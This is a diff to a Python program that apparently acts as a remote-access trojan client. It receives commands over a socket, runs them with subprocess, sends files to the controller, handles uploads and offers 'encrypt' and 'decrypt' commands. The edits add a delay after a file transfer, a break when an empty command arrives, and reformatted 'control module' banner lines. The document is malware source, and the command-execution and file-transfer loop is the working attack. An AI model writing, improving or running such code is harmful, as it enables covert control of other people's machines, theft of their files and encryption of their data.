@@ -1,6 +1,7 @@
 import os
 import socket
 import subprocess
+import time
 import wave
 
 import pyaudio
@@ -114,6 +115,7 @@ def infinite_body():
                 if not bytes_read:
                     break
                 s.sendall(bytes_read)
+        time.sleep(1)
         s.send('^^^^^^^^^^^^^^^^^^^^^'.encode())
 
     def upload():
@@ -186,9 +188,9 @@ def infinite_body():
             s.send('Wrong path!'.encode())
 
     '''
-    +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-    control module || control module || control module || control module || control module ||
-    +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    control module || control module || control module || control module || control module
+    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
     '''
 
     while True:
@@ -213,6 +215,8 @@ def infinite_body():
             encrypt()
         elif command.lower() == 'decrypt':
             decrypt()
+        elif command == b'':
+            break
         else:
             # execute the command and retrieve the results
             output = subprocess.getoutput(command)
